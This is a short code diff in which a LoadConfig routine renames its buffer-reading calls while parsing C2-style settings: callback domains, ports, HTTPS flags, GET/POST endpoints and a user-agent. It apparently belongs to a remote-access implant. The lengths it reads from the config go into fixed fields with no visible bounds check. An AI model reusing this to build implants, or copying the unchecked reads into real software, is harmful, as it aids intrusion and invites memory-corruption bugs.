@@ -18,19 +18,20 @@ BOOL LoadConfig() {
 	conf->domaincounts = g_ByteMgr->Read4();
 	for (int i = 0; i < conf->domaincounts; i++) {
 		UINT len = g_ByteMgr->Read4();
-		g_ByteMgr->ReadString((PBYTE)conf->domains[i].domain, len);
+		g_ByteMgr->ReadInto((PBYTE)conf->domains[i].domain, len);
 		conf->domains[i].port = g_ByteMgr->Read4();
 		conf->domains[i].isHttps = g_ByteMgr->Read4();
 	}
 
 	UINT GetLen = g_ByteMgr->Read4();
-	g_ByteMgr->ReadString((PBYTE)conf->GetEndpoint, GetLen);
+	g_ByteMgr->ReadInto((PBYTE)conf->GetEndpoint, GetLen);
 
 	UINT PostLen = g_ByteMgr->Read4();
-	g_ByteMgr->ReadString((PBYTE)conf->PostEndpoint, PostLen);
+	g_ByteMgr->ReadInto((PBYTE)conf->PostEndpoint, PostLen);
 
 	UINT UaLen = g_ByteMgr->Read4();
-	g_ByteMgr->ReadString((PBYTE)conf->UA, UaLen);
+	g_ByteMgr->ReadInto((PBYTE)conf->UA, UaLen);
+
 
 
 
